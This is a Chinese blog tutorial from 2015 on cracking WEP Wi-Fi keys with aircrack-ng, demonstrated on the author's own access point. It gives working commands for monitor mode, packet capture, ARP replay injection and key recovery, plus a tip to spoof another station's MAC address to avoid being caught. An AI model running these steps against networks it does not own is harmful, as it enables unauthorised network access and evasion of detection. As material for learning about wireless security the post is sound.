title: Aircrack-ng 破解 WEP
slug: aircarck-ng-wep
date: 2015-06-29 12:06:15
tags: aircrack-ng, WEP

本文分为 4 小部分:

* 背景知识
* 破解原理简介
* aircrack-ng 套件的安装
* 实际破解流程


## 背景知识

### 网卡设备的工作模式

* Station
  这就是我们通常情况下上网时, 笔记本, 手机中的网卡所工作的模式. 当网卡工作在这种模式下时, 它可以连接到其他的 AP 上.

* AP
  网卡工作在这种模式时, 可以接受其他的 Station 的连接. 具体能够接受多少 Station 的连接, 就要看这个网卡自身的能力了, 也就是我们所说的带机量.

* Monitor
  这其实是我们这篇文章里最重要的一个工作模式. 我们这篇文章所说的破解方式, 一定要网卡工作在这种模式才行. 当网卡工作在这个模式的时, 网卡就能够接收到周围所有的数据帧, 这个过程我们就叫做 Interception. 需要注意的是, 网卡要工作在这个模式, 需要满足以下两点才行:

   1. **Wi-Fi 芯片** (下面会介绍) 自身需要支持 Monitor 模式, 这也就意味着网卡芯片上实现 802.11 协议栈的固件程序具有不过滤其他数据帧的功能, 因为硬件射频电路本身是不会过滤数据帧的
   2. Aircrack-ng 所运行的操作系统, 需要拥有支持 Wi-Fi 芯片的 Monitor 模式的驱动程序

### 网卡与网卡芯片

上面我们提到了 **Wi-Fi 芯片** 这个词, 不了解的同学可能不懂了: 不是一直说网卡网卡的吗, 怎么又冒出一个 Wi-Fi 芯片? (如不特殊说明, 下文中的 "芯片" 以及 "网卡芯片" 也是指 "Wi-Fi" 芯片)

大家一定不要搞混了, 网卡和 Wi-Fi 芯片完全不是同一个东西.

* Wi-Fi 芯片是被芯片厂商设计来专门跑 802.11 协议的, 对于 802.11 数据帧的处理, WPA/WEP 加密协议做了很多优化. 比较有名的 Wi-Fi 芯片厂商有 Atheros, Broadcom 等.
* 而网卡则是在芯片的基础上做了一些软硬件方面的功能延伸, 比如在硬件方面, 网卡添加了一些其它的组件或芯片 (指除 Wi-Fi 芯片之外的芯片), 比如加上一个自家的 MCU, 大容量 Flash, 大容量 RAM, 放大天线等等; 又比如在软件方面, 移植一个牛逼的操作系统跑在 MCU 上. 比较有名的网卡厂商, 比如网件, TP-Link, Netcore 等, 所作的工作无非如此.

网卡芯片才是实现整个 802.11 协议的核心的软硬件部分. 射频, 数据帧处理, 加解密等等都是在这里处理的

### WEP 加密协议

要破解 WEP, 当然要首先对 WEP 有一定的了解才好. 但是如果要看懂本文, 我们只要知道几个要点就好, 这几个要点贯穿后文, 如果大家看到后面有看不懂的地方, 可以返回这里找对应的要点.

1. WEP 使用的是名为 RC4 的流式对称加密算法. 且 WEP 被设计为最多能支持 4 个密钥
2. 但是 WEP 并没有一个健全的密钥管理机制. 密钥的管理机制是厂商自定义的, 根据密钥分配的方式特点, WEP 可以分为静态 WEP 与动态 WEP
3. 静态 WEP 出现在 WEP 早期, WEP 缺乏健全的密钥管理机制, 导致密钥一般都是网络管理员手动分配的, 并且用于连接到此 AP 的所有工作站, 这个密钥也就是默认密钥. 这个密钥用于所有 Station 与 AP 之间的所有数据帧, 并且由于更换密钥就意味着网管的繁杂的工作量, 所以大多数场合下密钥已经设定, 几乎就不修改了, 这对系统的安全性造成了很大的威胁
4. 上面说了 WEP 最多能支持 4 个密钥. WEP 最初这么设计, 并没有什么高深的动机, 其目的有两点: 1. 使 AP 能不至于一直用一个 key, 或多或少的增强一点安全性 2. 减轻网管的负担, 在更换 key 的时候, 可以平滑的更换, 不至于必须在同一下午到所有 Station 上重设 Key. 比如说, 0 号 key 已经用了一个月了, 网管想要换成 1 号 key, 那么网管只需在 AP 管理界面, 将 1 号 key 启用, 但是并不禁用 0 号 key. 这样网络上 AP 发给 Station 的数据帧就都是用 1 号 key 加密的了, 没有修改成 1 号 Key 的 Station 发给 AP 的数据帧仍然是 0 号 key 加密的, 这也没关系, 因为 AP 也能解读 0 号 key 的密文. 但是网管可以不用急于一个下午更新完所有 Station 上的 Key 了, 他可以花一个月更新完, 然后再 AP 管理界面上禁用 0 号 key. 这样, 整个网络的 key 就平滑的升级完了.
    大部分路由器的 WEP 密钥配置就是这种方式, 见下图:

    ![wep-7.png](/images/aircrack-ng-wep-7.png)

    (WEP 标准没有规定的密钥 (WEP seed) 长度, 不过标准中以 64bit 来举例的, 其中前 24bit 是 IV, 也就是说只有 40bit 是用户可键入的, 也就是 5 个 ASCII 字符; 大部分路由器都支持 128bit 或以上的 WEP seed 长度, 同理, 对 128bit WEP seed 来说, 可供用户键入的 ASCII 字符数就是 13 个)
5. 动态 WEP 并没有出现在 802.11 标准中, 而是厂商们自定义的, 可以说是事实标准吧. 动态 WEP 的一些思想后来被 802.11i 采纳了. 在动态 WEP 中, 可以使用两种密钥, 一种叫做映射密钥, 所有的由工作站发送的, 或者是发往工作站的数据帧, 都用这个密钥加密; 另一种叫做默认密钥, 所有其它的数据帧都用这个密钥加密, 比如多播/广播数据帧.
    因为要实现这两种密钥, 所以在动态 WEP 中, 4 个密钥的编号就不能像静态 WEP 中那么用了. 由于动态 WEP 对密钥管理机制的原因, 可能适用于 Station 和适用于 AP 的芯片在结构和性能上还会有所不同.
    对于 Station 来说, 一般 0 号密钥被用作映射密钥, 用于发送单播消息给 AP; 而 1 号密钥被用作默认密钥, 用于发送多播/广播给 AP (你知道的, 在基础结构型里面, Station 发什么包都得经过 AP 的).
    而对于 AP 来说, 一般来说其芯片会有较多的密钥卡槽 (不止是 4 个了), 对于每一个连接上来的 Station, 至少映射密钥是互不相同的, 默认密钥则可能相同也可能不同. 另外, 每个 Station 与 AP 通信用的映射密钥也是随时间动态改变的, 这也是 "动态 WEP" 名称的由来.
    从上面的说明我们看出, 动态 WEP 需要为每个 Station 维持一个不同的密钥, 而且还要及时的更改这些密钥, 所以相比静态 WEP, 动态 WEP 一定还引入了某种密钥管理与分配的机制.
6. WEP 协议所使用的密钥中, 前 24 位被称作初始向量 (Initialise Vector), 初始向量是随没一个数据帧变化的, 其目的就是为了使密钥每次都不相同, 增强安全性

### WEP 所使用的身份认证协议

WEP 可以使用两种身份认证协议:

1. 开放认证 (Open Authentication)
    Station 不需要经过身份验证就能连接 AP. 但是要想后续和 AP 通信, 你还是得提供正确的密钥. 具体表现为, 你用电脑连接某个开放认证的 WEP 热点, 可能瞎指定一个密钥就能过认证, 但是并不能与 AP 通信, 可能连 IP 地址都获取不到
2. 共享密钥认证 (Shared Key Authentication)
    共享密钥, 也就是我们在 AP 管理后台指定的 4 个密钥之一, 它本是用来加密数据帧的. 这个认证方式之所以叫做共享密钥认证, 也就是因为, 我们直接使用用来加密数据帧的密钥来认证 Station 了. 具体表现为, 当你连接 AP 时, 必须提供正确的密钥, 否则认证是过不了, 会直接给你提示密码错误.

大部分的动态 WEP 并没有在身份认证这块做什么文章, 所以动态 WEP 也是上用的上述两种认证方式. 可以看出, 上面两种认证方式都是简单粗暴的, 只要知道了密钥, 任何人, 在任何机器上, 就都能连 AP; 只要这台机器上连上过 AP, 那么其它任何人再过来用这台机器, 就也能直接上这个 AP. 这种认证方式并不能做到对每个人进行认证, 充其量是对每个 Station 进行认证. 这个问题在 802.1X 中得到了解决.

## 破解机理

空气中充满着 AP 与 Station 通信的数据帧, 对于静态 WEP 来说, 这些数据帧都是使用同一个密钥加密过的 (对于动态 WEP 也可以粗略的这么认为), 我们破解 WEP 的目的就是要找到这个密钥, 我们需要捕获这些数据帧, 分析它们, 从中逆向推出密钥. 这要求我们的网卡要能够接收到空气中其他的 AP 和 Station 之间的数据帧才行, 而通常情况下, 我们的网卡都是只接收发送往我们自己机器的数据帧的. 所以我们要令我们的网卡工作在 monitor 模式, 以捕获到周围所有的数据帧.

另外, 在 WEP 协议中, 数据帧的加密并不是单纯的使用用户设定的密钥, 而是会在这个密钥的基础上加上一个 24bit 的 IV (Initialization Vector), 也叫做初始向量, 组合成一个新的密钥 (这个新的密钥叫做 WEP seed, 为方便起见, 下文我们仍称其为 "密钥"). 
初始向量是不断变化的, 对每一个数据帧来说, 初始向量都不同, 所以组成的新的密钥也是不同的. 所幸的是, 初始向量是明文放在数据帧里的, 只要我们收集的数据帧足够多, 就能借助工具从中分析出密钥来. 不过具体需要收集多少 IVs 就不一定了, 24bit 意味着 IVs 的总数量有 1600W 多, 但是这些 IVs 的身份并不是等价的, 有些 IVs 本身属于弱 IV, 若果我们幸运, 捕获到的 IVs 大部分是弱 IV, 那么可能我们只需要 20000 IVs 就能分析出密钥了, 运气不好的话, 可能收集再多的 IVs, 最终也还是不能破解.

经验告诉我们, 一般收集了 40000 ~ 85000 IVs 的话, 就能足以破解出密钥.

## aircrack-ng suite 的介绍与安装

虽然名字叫做 aircrack-ng, 但是实际上它是一组套件, 这组套件中包含了多个不同目的的程序. 要使用 aircrack-ng 套件的话对你的机器是有一定的要求的. 这个要求其实就是我们上面说的网卡要运行在 Monitor 模式时需要满足的要求. 那么就是:

1. 网卡里的 Wi-Fi 芯片需要支持 monitor 模式
    那么我怎么知道我电脑里的网卡是否支持 Monitor 模式呢? 首先你需要知道你的网卡里的 Wi-Fi 芯片是什么型号, 然后到这个页面检查一下自己网卡的芯片是不是在列表里: http://www.aircrack-ng.org/doku.php?id=compatibility_drivers.
    找出自己网卡中 Wi-Fi 芯片的型号可能不是个轻松的活儿, 你可以按照这里的流程: http://www.aircrack-ng.org/doku.php?id=compatibility_drivers#determine_the_chipset, 如果还是不能确定自己 Wi-Fi 芯片型号的话, 那么大可以先略过这一步, 因为现在的网卡, 基本上都支持 Monitor 模式了.
2. aircrack-ng 所运行的系统, 要有支持你的网卡的 Monitor 模式的驱动
    我们讲的是在 Linux 系统下使用 aircrack-ng, 所以我们只要确定我们的网卡拥有在 Linux 系统下的相应的驱动就好. 当你已经在运行一台 Linux 机器, 并且无线网卡能够正常工作的话, 那么你的无线网卡驱动肯定也已经安装好了. 同第一点一样, 现在的无线网卡驱动程序一般也是支持 Monitor 模式的, 不需太担心. 继续往下看就好.

如果你在进行下面的步骤时发现网卡不能进入 Monitor 模式, 那么要么是你的网卡芯片不支持 Monitor 模式, 要么是你的驱动程序不支持 Monitor 模式, 如果是第二种情况的话, 那么你可能需要给你的驱动程序打 Patch, 当然前提是网上有你的网卡驱动的 Patch (不排除你是大神, 能自己给你的网卡驱动写 Patch). 如果是第一种情况的话, 那你只能换个网卡了.

如果你是新手, 那么不管对于哪种情况, 我都建议你去买一个支持 aircrack-ng 的 USB 网卡, 给驱动打 Patch, 重新编译驱动对新手来说是个比较折腾的过程, 直接买个 USB 网卡, 省时又省力.

### aircrack-ng 套件的安装

在 Linux 各个发行版的源里都有包含 aircrack-ng 套件, 你可以按照你的发行版安装包的方式安装 aircrack-ng. 当然如果你使用的是 BackTrack, Kali Linux 这种专为 Hacker 定制的发行版, 那么 aircrack-ng 肯定早已安装在你的系统中.

### aircrack-ng 套件中的成员

下面我们介绍一下 aircrack-ng 套件中的成员, 这些成员的顺序, 也就是本文后面它们的出场顺序

* airmon-ng
  这个工具的作用是将你的无线网卡切换到 monitor 模式, 并且它还能检查并杀死其他正在使用你无线网卡的进程 --- 当我们使用无线网卡进行 Intercept 工作的时候, 最好不要有其他进程干扰.
* airodump-ng
  这个工具的作用是捕获周围的数据帧, 当无线网卡工作在 monitor 模式时, 这个工具捕获到的将是周围所有的数据帧. 一般会将捕获到的数据帧保存下来, 然后使用 aircrack-ng 工具分析这些数据帧, 从中破解出密钥. 默认情况下, airodump-ng 会不断的切换你用于侦听的无线接口的 channel.
* aireplay-ng
  使用 airodump-ng 捕获数据帧的前提是: 你周围得有其它的已经和 AP 关联了的 Station 才行, 这样才会有 Station 和 AP 之间的数据帧, 而且, 虽然有 Station, 但是这些 Station 都处于不怎么活动的状态也是不行的. airodump-ng 要抓获足够多的帧, aircrack-ng 才能够破解出密钥, 如果这些 Station 都不怎么活动, 那你可能抓一天也抓不够足够的数据帧. 这个时候就需要 aireply-ng 这个工具了!
* aircrack-ng
  这个工具能够分析 airodump-ng 抓到的那些数据帧, 从中破解出密钥

### aireplay-ng

之所以要把 aireplay-ng 单独拿出来再说一下, 是因为要使用 aireply-ng, 还需要满足一个条件, 那就是你的网卡能够伪装成别的网卡发送数据帧, 要满足这个条件, 基本上全依赖驱动程序的支持, 这个过程叫做 Injection (注入).

## 开始破解!

终于可以开始了, 由于是出于学习目的, 再加上周围用 WEP 的人已经不多了, 所以我这里用刚买的 WNDR3800 开了一个演示用的热点, 使用 WEP 加密, 参数如下:

* SSID: crack-demo
* 密钥 (64bit): 134B395E16
* Channel: 6

(下面的命令都需要以 root 权限运行)

#### 开启侦听接口

首先, 使用 airmon-ng 命令检查并干掉其它可能会干扰我们工作的进程, 然后开启一个处于监听状态的虚拟接口:

        # airmon-ng check kill
        # ip link
        1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default 
            link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        2: enp0s25: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN mode DEFAULT group default qlen 1000
            link/ether xx:xx:xx:xx:xx:xx brd ff:ff:ff:ff:ff:ff
        3: sit0: <NOARP> mtu 1480 qdisc noop state DOWN mode DEFAULT group default 
            link/sit 0.0.0.0 brd 0.0.0.0
        4: wlp3s0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP mode DORMANT group default qlen 1000
            link/ether xx:xx:xx:xx:xx:xx brd ff:ff:ff:ff:ff:ff
        # airmon-ng start wlp3s0
        # ip link
        1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default 
            link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        2: enp0s25: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN mode DEFAULT group default qlen 1000
            link/ether xx:xx:xx:xx:xx:xx brd ff:ff:ff:ff:ff:ff
        3: sit0: <NOARP> mtu 1480 qdisc noop state DOWN mode DEFAULT group default 
            link/sit 0.0.0.0 brd 0.0.0.0
        4: wlp3s0: <BROADCAST,MULTICAST> mtu 1500 qdisc mq state UP mode DORMANT group default qlen 1000
            link/ether xx:xx:xx:xx:xx:xx brd ff:ff:ff:ff:ff:ff
        5: mon0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UNKNOWN mode DEFAULT group default qlen 1000
            link/ieee802.11/radiotap xx:xx:xx:xx:xx:xx brd ff:ff:ff:ff:ff:ff

在上面的输出中, wlp3s0 是我的无线网卡主要的虚拟接口名称, 你的可能与我的不同, 你可能是 wlan0 之类的. 另外出于隐私的原因, 我将所有的 MAC 地址都用 "xx:xx:xx:xx:xx:xx" 来代替了. 从最后的 `ip link` 输出中, 我们看到多了一个接口: mon0, 这个接口工作就是在 monitor 模式的虚拟接口, 我们后面的操作都是对这个接口进行操作.

另外需要注意的是, 我们要确保我的的主虚拟接口: wlp3s0 被关闭了, 如果你安装的 aircrack-ng 套件比较新的的话 (目前最新的是 1.2_rc2, 经测试我的 1.2_rc1 的版本也是可以的), 在 `airmon-ng check kill` 的时候 wlp3s0 将是自动被关闭了. 但是很可能你的不是最新的, 所以我们这里最好是手动关闭一下 wlp3s0:

    # ip link set dev wlp3s0 down
    # ip link
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default 
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    2: enp0s25: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN mode DEFAULT group default qlen 1000
        link/ether xx:xx:xx:xx:xx:xx brd ff:ff:ff:ff:ff:ff
    3: sit0: <NOARP> mtu 1480 qdisc noop state DOWN mode DEFAULT group default 
        link/sit 0.0.0.0 brd 0.0.0.0
    4: wlp3s0: <BROADCAST,MULTICAST> mtu 1500 qdisc mq state DOWN mode DEFAULT group default qlen 1000
        link/ether xx:xx:xx:xx:xx:xx brd ff:ff:ff:ff:ff:ff
    5: mon0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UNKNOWN mode DEFAULT group default qlen 1000
        link/ieee802.11/radiotap xx:xx:xx:xx:xx:xx brd ff:ff:ff:ff:ff:ff

注意到 `ip link` 的输出中 wlp3s0 没有了 UP 这个标记, 代表 wlp3s0 确实被关闭了.

#### 确定要破解的 WEP 无线路由的 BSSID

我们前面准备的 crack-demo 这个 AP 工作在 6 频道, 这是我们自己设的, 当我们在外面搞这个活动时, 可能一开始不会知道目标 AP 所工作的频道, 所以首先我们先运行这个命令:

    # airodump-ng mon0

不加额外的参数的话, 这个命令默认就会不断的从频道 1 切换到频道 11, 来搜索所有的热点. 它的输出如下:

![wep-1.png](/images/aircrack-ng-wep-1.png)

哎呀, 我附近的热点真多啊, 我这显示器一屏都放不下了, 这只是一部分, 不过没关系, 我们的目标已经出来了, 就在第三行: crack-demo, 频道 6, WEP 加密, 以及其 BSSID. 为了保护街坊邻居以及我自己的隐私, MAC 地址部分我隐藏了厂商地址段, 以及除了我们实验用的 crack-demo, 其它的 SSID 我也都盖住了.

获取了这些信息之后, 我们按下 `Ctrl-C` 退出 airodump-ng, 因为现在的 airodump-ng 会不断的变换频道来扫热点, 对我们下面的工作会有些许影响.

#### 收集数据帧

当我们知道了目标的 BSSID 以及工作的频道之后, 就能对其精准的收集数据帧了, 我们运行下面的命令 (被盖住的厂商地址段用 XX:XX:XX 表示):

    # airodump-ng -c 6 --bssid XX:XX:XX:AC:41:21 -w /tmp/dump mon0

这个命令告诉 airodump-ng 令其收集 6 频道, BSSID 为  XX:XX:XX:AC:41:21 的 AP (也就是我们的 crack-demo 这个 AP) 的数据帧, 并将结果保存到 /tmp 目录下以 dump 为前缀的文件里. 这个命令的输出如下:

![wep-2.png](/images/aircrack-ng-wep-2.png)

其中下面的第二个 Station, 地址是 XX:XX:XX:18:EE:9F 的是我的手机, 我是为了演示, 将自己的手机连上了这个 AP. 还记不记得前面说过, 要想捕获数据帧, 得有 Station 连着 AP 才能捕获到有效的数据帧啊.

不过目前这个 AP 只连了我的手机的话, 这个网络是很空闲的, 可以看到, 1 分钟过去了, 才收集了 132 的帧, 这还是我手机一直屏幕亮着的状态, 我试过, 当我的手机锁屏了之后, 几乎帧数就不长了. 而且, 捕获的帧数和有效的 IVs 数目并不是一比一的关系. 有效 IVs 的数目比捕获的帧数少得多得多. 我们前面说过要得到密钥, 一般要获取 40000 ~ 85000 个左右的帧. 按照这个速度, 破解个 WEP 都要 10 多个小时.

那怎么办呢? 往下看

#### (可选) 激发 AP 产生更多的数据帧

为了在短时间内捕获到更多的帧, 我们才用主动攻击的办法, 这就需要用到 aireplay-ng 了, 运行下面的命令:

    # aireplay-ng -3 -b XX:XX:XX:AC:41:2C -h XX:XX:XX:E0:75:90 mon0

这条命令会去捕获一条 ARP 请求帧, 然后利用这个 ARP 请求帧对 AP 发起重放攻击. 其中
*-b XX:XX:XX:AC:41:2C    指定 AP 的 MAC 地址
* -h XX:XX:XX:E0:75:90    指定的是重放的 ARP 请求帧的源 MAC 地址. 这里为简便起见, 我用了我自己网卡的地址, 但实际上是可以用已经和 AP 关联的任何一个 Station 的地址的, 而且在实战的时候最好是不要使用自己网卡的 MAC 地址, 以免被抓住.

![wep-3.png](/images/aircrack-ng-wep-3.png)

然后我们切换回 airodump-ng 的窗口, 可以看到, 这下子帧的数量 "唰" 的上去了! 注意因为我用的是我本机的网卡发的 ARP 请求, 所以 XX:XX:XX:18:EE:9F 那一行数据帧的数量变化不明显, 我们应该看 XX:XX:XX:E0:75:90 那一行的数据帧的变化.

![wep-4.png](/images/aircrack-ng-wep-4.png)

#### 破解

当你运行 `airodump-ng -c 6 --bssid XX:XX:XX:AC:41:21 -w /tmp/dump mon0` 的时候, 捕获的数据帧已经开始往 /tmp/dump 里面写了, 这时候其实你就可以使用 aireplay-ng 来破解密钥了. 那么我们来运行:

    # aircrack-ng -b 00:01:02:03:04:05 /tmp/dump*.cap

输出如下:

![wep-5.png](/images/aircrack-ng-wep-5.png)
![wep-6.png](/images/aircrack-ng-wep-6.png)

注意我红圈标出来的地方, 一开始 aireplay-ng 使用 4150 个 IVs 来推出密钥, 失败了. 然后第二张图里, 当 IVs 数目达到接近 20000 时, aireplay-ng 这时破解成功了. 找出的密钥正是我们设置的: 134B395E16

好了, 至此为止, 我们的 WEP 破解就算成功了.

WEP 加密方式现在几乎已经没有人在用了, 现在的路由器都会引导用户使用 WPA 加密方式. 所以这篇文章其实也只能够用来学习探究, 并没有什么实战价值
